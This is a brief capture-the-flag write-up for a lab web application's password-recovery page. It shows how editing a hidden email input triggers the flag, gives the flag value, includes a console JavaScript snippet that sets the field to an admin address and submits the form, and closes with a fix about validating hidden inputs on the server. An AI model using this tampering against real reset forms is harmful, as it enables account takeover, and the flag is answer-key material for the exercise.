# "Resetting" a password
1. Try to reset a password. http://192.168.99.100/index.php?page=recover#
2. There is no way to give an email, but there is a hidden input with an email that can be changed.
3. Changing the email allows the Submit button to work.
4. Click on it and you get a flag.

Flag: 1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0 (text-transform uppercase)

JavaScript that can be pasted into the console:
```javascript
(() => {
  const form = document.querySelector('form');
  const email = form.children[0];
  email.value = 'admin@example.com';
  form.children[1].click();
})();
```

# How to fix
First of all, the email field should probably not be hidden if it's to actually be used for resetting a password. So there's probably nothing to really fix here. Any hidden input values should be checked for validity on the server.
